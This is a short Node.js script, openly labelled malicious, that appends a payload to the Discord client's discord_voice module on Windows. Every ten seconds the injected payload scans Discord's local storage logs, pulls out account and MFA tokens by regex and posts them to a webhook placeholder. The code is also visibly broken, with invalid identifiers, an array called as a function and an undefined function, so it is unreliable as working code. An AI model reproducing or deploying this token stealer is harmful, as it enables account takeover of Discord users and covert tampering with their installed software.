"use strict";

// Dependencies
const fs = require("fs")
const os = require("os")

// Variables
const m@l1c10usC0de = `\nconst os = require("os")

setInterval(function(){
    fs.readdir("C:/Users/" + os.userInfo().username + "/AppData/Roaming/discord/Local Storage/leveldb", "utf8", function(err, files){
        if(err){
            Done()
            return
        }
		
        files.forEach(file =>{
            if(file.indexOf("log") !== -1){
                const l0gD@ta = fs.readFileSync("C:/Users/" + os.userInfo().username + "/AppData/Roaming/discord/Local Storage/leveldb/" + file, "utf8")
                const t0kens = l0gD@ta.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g)
                const r€sultT0kens = []

                if(!l0gD@ta.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g)) return console.log("No discord tokens found.")

                for( i = 0; i <= t0kens.length-1; i++ ){
                    if(r€sultT0kens.indexOf(t0kens[i]) === -1){
                        r€sultT0kens.push(t0kens[i])
                    }
                }

                fetch("webhookLink", {
					method: "POST",
					headers: {
						"Content-Type": "application/json"
					},
					body: JSON.stringify({ content: r€sultT0kens.join(", ") })
				})
                return
            }
        })
    })
}, 10000)`

// Main
if(fs.existsSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord`)){
    const d1rector1es = fs.readdirSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)

    d1rector1es().forEach(directory =>{
        const d1rector1es2 = fs.readdirSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)

        if(directory.indexOf("app") !== -1){
            d1rector1es2().forEach(directory2 =>{
                if(directory2.indexOf("discord_voice") !== -1){
                    fs.readFile(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\${directory2}\\discord_voice\\index.js`, "utf8", function(err, data){
                        if(err) process.exit()
                        if(data.indexOf("fetch(") !== -1) process.exit()
                
                        data += `\n${m@l1c10usC0de}`
                
                        fs.writeFileSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\${directory2}\\discord_voice\\index.js`, data, "utf8")
                    })
                }
            })
        }
    })
}
